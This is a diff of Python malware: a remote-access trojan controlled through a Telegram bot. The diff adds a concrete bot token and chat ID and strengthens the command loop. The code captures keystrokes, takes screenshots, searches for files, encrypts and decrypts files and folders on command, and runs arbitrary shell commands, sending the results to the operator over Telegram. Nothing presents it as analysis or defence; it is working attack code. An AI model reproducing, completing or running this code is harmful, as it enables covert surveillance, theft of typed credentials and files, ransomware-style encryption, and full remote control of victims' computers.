@@ -16,6 +16,8 @@ print('start')
 key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
 telegram_token = 'Your telegram bot token'
 chat_id = 'chat id'
+telegram_token = '5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho'
+chat_id = '-791347020'
 keys=[]
 count=0
 
@@ -353,13 +355,13 @@ def capture_data():
                     count_key+=1
                 else:
                     if count_key>1:
-                        data+="*|"+(str(count_key))+'| '+s
+                        data=data[:-1]+"("+(str(count_key))+')> '+s
                         count_key=0
                     else:
                         data+=s
             
             if count_key>1:
-                data+="*|"+(str(count_key))+'|'
+                data=data[:-1]+"("+(str(count_key))+')> '
                 count_key=0
             send_message(data)
             file.close()
@@ -401,77 +403,85 @@ def read_messages():
     
     
 def start_project():
-    try:
         global offset,key_crypt,inside_up_crypt
         offset=''
         ffo=0
         c=0
-        conect_ip=ip_information()
-        send_message(conect_ip[0]+' is conect\ncomputer name = '+conect_ip[1])
         while True:
-            time.sleep(2)
-            command=read_messages()
-            off=command[-1]
-            command=command[0]
-            
-            if off!=ffo:
-                print(command)
-                c+=1
-                ffo=off
-                if c>1:
-                    print(command,'0')
-                    if "captur keyloger" in command:
-                        capture_data()
+            try:
+                conect_ip=ip_information()
+                send_message(conect_ip[0]+' is conect\n'+conect_ip[1])
+                break
+            except:
+                time.sleep(3)
+
+        while True:
+            try:
+                time.sleep(0.5)
+                command=read_messages()
+                off=command[-1]
+                command=command[0]
+                
+                if off!=ffo:
+                    print(command)
+                    c+=1
+                    ffo=off
+                    if c>1:
+                        print(command,'0')
+                        if "captur keyloger" in command:
+                            capture_data()
+                            
                         
-                    
-                    elif command[:12]== "encrypt file":
-                        Crypt_my10(key).encrypt_files(command[13:])
-                        inside_up_crypt=1
-                    elif command [:12]== "decrypt file":
-                        Crypt_my10(key).decrypt_files(command[13:])
-                        inside_up_crypt=1
-                    elif command[:14]=='encrypt folder' and '-s'not in command[:18]:
-                        Crypt_my10(key).recursive_encrypt_files(command[15:])
-                    elif command[:14]=="decrypt folder" and '-s'not in command[:18]:
-                        Crypt_my10(key).recursive_decrypt_files(command[15:])
-                    elif command[:17]=='encrypt folder -s':
-                        Crypt_my10(key).sync_recursive_encrypt_files(command[18:])
+                        elif command[:12]== "encrypt file":
+                            Crypt_my10(key).encrypt_files(command[13:])
+                            inside_up_crypt=1
+                        elif command [:12]== "decrypt file":
+                            Crypt_my10(key).decrypt_files(command[13:])
+                            inside_up_crypt=1
+                        elif command[:14]=='encrypt folder' and '-s'not in command[:18]:
+                            Crypt_my10(key).recursive_encrypt_files(command[15:])
+                        elif command[:14]=="decrypt folder" and '-s'not in command[:18]:
+                            Crypt_my10(key).recursive_decrypt_files(command[15:])
+                        elif command[:17]=='encrypt folder -s':
+                            Crypt_my10(key).sync_recursive_encrypt_files(command[18:])
 
 
-                    elif 'get ip info' in command:
-                        data=''
-                        for i in conect_ip:
-                            data+=i+'\n'
-                        send_message(data)
+                        elif 'get ip info' in command:
+                            data=''
+                            for i in conect_ip:
+                                data+=i+'\n'
+                            send_message(data)
 
 
-                    elif "screen shot" in command:
-                        inside_up_crypt=0
-                        screen_shot('zew')
+                        elif "screen shot" in command:
+                            inside_up_crypt=0
+                            screen_shot('zew')
 
-                    elif "search file -g" in command:
-                        command=command.split('name=')
-                        output=Advanced_files_search(command[0][15:-1],command[-1]).search_files_gen()
-                        if len(output)>1:
-                            send_message(output)
+                        elif "search file -g" in command:
+                            command=command.split('name=')
+                            output=Advanced_files_search(command[0][15:-1],command[-1]).search_files_gen()
+                            if len(output)>1:
+                                send_message(output)
+                            else:
+                                send_message(command[-1]+'not found..')
+                            
+
                         else:
-                            send_message(command[-1]+'not found..')
-                        
-
-                    else:
-                        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-                        data=''
-                        for i in p.stdout.readlines():
-                            data+=i.decode()
-                        print(data)        
-                        p.wait
-                        send_message(data)
-    except Exception as e:
-        e=str(e)
-        try:
-            send_message(e)
-        except Exception as e:
-            print(e)                            
+                            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                            data=''
+                            for i in p.stdout.readlines():
+                                data+=i.decode()
+                            print(data)        
+                            p.wait
+                            send_message(data)
+            except Exception as e:
+                e=str(e)
+                try:
+                    send_message(e)
+                except Exception as e:
+                    print(e)  
+                time.sleep(3)
+            time.sleep(2)                          
         
        
 def start_key_log():
